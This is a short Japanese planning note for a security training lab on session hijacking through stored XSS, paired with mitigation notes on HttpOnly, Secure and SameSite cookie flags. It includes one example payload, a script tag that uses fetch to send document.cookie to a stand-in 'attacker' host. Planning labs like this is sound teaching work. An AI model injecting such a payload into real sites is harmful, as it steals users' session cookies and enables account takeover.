# セッションハイジャック

## 対象ラボ

### 1. XSS経由のセッション窃取

- **概要**: XSS脆弱性を利用してCookieからセッションIDを窃取し、他ユーザーになりすます
- **攻撃例**: `<script>fetch('http://attacker/?c='+document.cookie)</script>` をStored XSSで投稿
- **技術スタック**: Hono API + Cookie + XSSラボと連携
- **難易度**: ★★☆

## 実装メモ

- HttpOnly なし (脆弱) → HttpOnly / Secure / SameSite 付き (安全)
- XSSラボと組み合わせて実演

## 参考資料

- [OWASP - Session Hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
